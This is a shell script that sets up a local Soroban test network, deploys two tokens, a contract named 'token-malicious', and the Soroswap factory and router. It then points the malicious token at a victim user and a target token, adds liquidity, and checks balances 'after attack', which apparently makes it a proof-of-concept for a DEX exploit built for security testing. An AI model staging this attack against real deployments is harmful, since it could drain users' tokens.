NETWORK="standalone"

mkdir -p .soroban
SOROBAN_RPC_HOST="http://stellar:8000"
SOROBAN_RPC_URL="$SOROBAN_RPC_HOST/soroban/rpc"
SOROBAN_NETWORK_PASSPHRASE="Standalone Network ; February 2017"
FRIENDBOT_URL="$SOROBAN_RPC_HOST/friendbot"

echo Add the $NETWORK network to cli client
soroban config network add "$NETWORK" \
  --rpc-url "$SOROBAN_RPC_URL" \
  --network-passphrase "$SOROBAN_NETWORK_PASSPHRASE"

echo Create the token-admin identity
soroban config identity generate token-admin

TOKEN_ADMIN_ADDRESS="$(soroban config identity address token-admin)"

echo Create user identity
soroban config identity generate user
USER_ADDRESS="$(soroban config identity address user)"

echo Fund token-admin account from friendbot
curl  -X POST "$FRIENDBOT_URL?addr=$TOKEN_ADMIN_ADDRESS" > /dev/null

echo Fund user account from friendbot
curl  -X POST "$FRIENDBOT_URL?addr=$USER_ADDRESS" > /dev/null

ARGS="--network $NETWORK --source token-admin"

## Compile and deploy tokens:
echo "Compile and deploy token 0"
cd /workspace/contracts/token
make build
cd /workspace/
TOKEN_WASM="/workspace/contracts/token/target/wasm32-unknown-unknown/release/soroban_token_contract.optimized.wasm"

TOKEN_0_ADDRESS="$(
  soroban contract deploy \
  --wasm /workspace/contracts/token/target/wasm32-unknown-unknown/release/soroban_token_contract.optimized.wasm \
  --source token-admin \
  --network $NETWORK
  )"
soroban contract invoke \
  --network $NETWORK --source token-admin \
  --id $TOKEN_0_ADDRESS \
  -- \
  initialize \
  --admin "$TOKEN_ADMIN_ADDRESS" \
  --decimal 7 \
  --name "TOKEN0" \
  --symbol "TOKEN0"
echo Deployed TOKEN_0 with ADDRESS: $TOKEN_0_ADDRESS


TOKEN_1_ADDRESS="$(
  soroban contract deploy \
  --wasm /workspace/contracts/token/target/wasm32-unknown-unknown/release/soroban_token_contract.optimized.wasm \
  --source token-admin \
  --network $NETWORK
  )"
soroban contract invoke \
  --network $NETWORK --source token-admin \
  --id $TOKEN_1_ADDRESS \
  -- \
  initialize \
  --admin "$TOKEN_ADMIN_ADDRESS" \
  --decimal 7 \
  --name "TOKEN1" \
  --symbol "TOKEN1"
echo Deployed TOKEN_1 with ADDRESS: $TOKEN_1_ADDRESS


echo "  "
echo "  -- "
echo "  "

echo "Compile and deploy token malicious"
cd /workspace/contracts/token-malicious
make build
cd /workspace/
TOKEN_MALICIOUS_WASM="/workspace/contracts/token-malicious/target/wasm32-unknown-unknown/release/soroban_token_contract_malicious.optimized.wasm"

TOKEN_MALICIOUS_ADDRESS="$(
  soroban contract deploy \
  --wasm $TOKEN_MALICIOUS_WASM \
  --source token-admin \
  --network $NETWORK
  )"
soroban contract invoke \
  --network $NETWORK --source token-admin \
  --id $TOKEN_MALICIOUS_ADDRESS \
  -- \
  initialize \
  --admin "$TOKEN_ADMIN_ADDRESS" \
  --decimal 7 \
  --name "TOKENMAL" \
  --symbol "TOKENMAL"
echo Deployed TOKEN_MALICIOUS with ADDRESS: $TOKEN_MALICIOUS_ADDRESS

echo Mint 10000000000 units of each token to user

soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_0_ADDRESS \
    -- \
    mint \
    --to "$USER_ADDRESS" \
    --amount "10000000000" &> /dev/null


soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_1_ADDRESS \
    -- \
    mint \
    --to "$USER_ADDRESS" \
    --amount "10000000000" &> /dev/null


soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    mint \
    --to "$USER_ADDRESS" \
    --amount "10000000000" &> /dev/null


echo Check user balance of each token
echo ".."

echo "TOKEN 0 BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_0_ADDRESS \
    -- \
    balance \
    --id "$USER_ADDRESS" 

echo "TOKEN 1 BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_1_ADDRESS \
    -- \
    balance \
    --id "$USER_ADDRESS"

echo "TOKEN MALICIOUS BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    balance \
    --id "$USER_ADDRESS"

echo "TOKEN 1 ADMIN BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_1_ADDRESS \
    -- \
    balance \
    --id "$TOKEN_ADMIN_ADDRESS"


# SETTING UP MALICIOUS TOKEN

soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    set_target_token_contract \
    --new_target_token_contract $TOKEN_1_ADDRESS 

echo Read target_token_contract
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    target_token_contract 

soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    set_target_user \
    --new_target_user $USER_ADDRESS 

echo Read target_user
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    target_user 

#########

FACTORY_WASM="/workspace/contracts/factory/target/wasm32-unknown-unknown/release/soroswap_factory.optimized.wasm"
ROUTER_WASM="/workspace/contracts/router/target/wasm32-unknown-unknown/release/soroswap_router.optimized.wasm"

####################################################
echo Compile , install pair and get WASM
cd /workspace/contracts/pair
make build &> /dev/null
cd /workspace/
PAIR_WASM="/workspace/contracts/pair/target/wasm32-unknown-unknown/release/soroswap_pair.optimized.wasm"

PAIR_WASM_HASH="$(
soroban contract install $ARGS \
  --wasm $PAIR_WASM
)"
echo "$PAIR_WASM_HASH" > /workspace/.soroban/pair_wasm_hash
echo "Pair contract installed successfully with hash: $PAIR_WASM_HASH"
echo "--"

####################################################
echo "Deploy the Factory contract"
FACTORY_ID="$(
  soroban contract deploy $ARGS \
    --wasm $FACTORY_WASM
)"

echo "$FACTORY_ID" > /workspace/.soroban/factory_id
echo "SoroswapFactory deployed successfully with FACTORY_ID: $FACTORY_ID"
echo "--"

echo Initialize Factory:
## fn initialize(e: Env, setter: Address, pair_wasm_hash: BytesN<32>) 
soroban contract invoke $ARGS \
  --id $FACTORY_ID \
  -- \
  initialize \
  --setter $TOKEN_ADMIN_ADDRESS \
  --pair_wasm_hash $PAIR_WASM_HASH &> /dev/null
echo "--"

echo Compile, deploy and intialize router contract
ROUTER_ID="$(
  soroban contract deploy $ARGS \
    --wasm $ROUTER_WASM)"

# Initialize the SoroswapRouter contract
echo "Initialize the SoroswapRouter contract"
soroban contract invoke $ARGS \
  --id $ROUTER_ID \
  -- \
  initialize \
  --factory "$FACTORY_ID" &> /dev/null

echo "--"

# ADD LIQUIDITY

echo "Adding Liquidity"
soroban contract invoke \
    --network $NETWORK \
    --source user \
    --id $ROUTER_ID \
    -- \
    add_liquidity \
    --token_a $TOKEN_0_ADDRESS \
    --token_b $TOKEN_MALICIOUS_ADDRESS \
    --amount_a_desired 4000000000 \
    --amount_b_desired 1000000000 \
    --amount_a_min 0 \
    --amount_b_min 0 \
    --to $USER_ADDRESS \
    --deadline 9737055687 

echo Check user balance of each token AFTER attack
echo ".."

echo "TOKEN 0 BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_0_ADDRESS \
    -- \
    balance \
    --id "$USER_ADDRESS" 

echo "TOKEN 1 BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_1_ADDRESS \
    -- \
    balance \
    --id "$USER_ADDRESS"

echo "TOKEN MALICIOUS BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_MALICIOUS_ADDRESS \
    -- \
    balance \
    --id "$USER_ADDRESS"

echo "TOKEN 1 ADMIN BALANCE:"
soroban contract invoke \
    --network $NETWORK \
    --source token-admin \
    --id $TOKEN_1_ADDRESS \
    -- \
    balance \
    --id "$TOKEN_ADMIN_ADDRESS"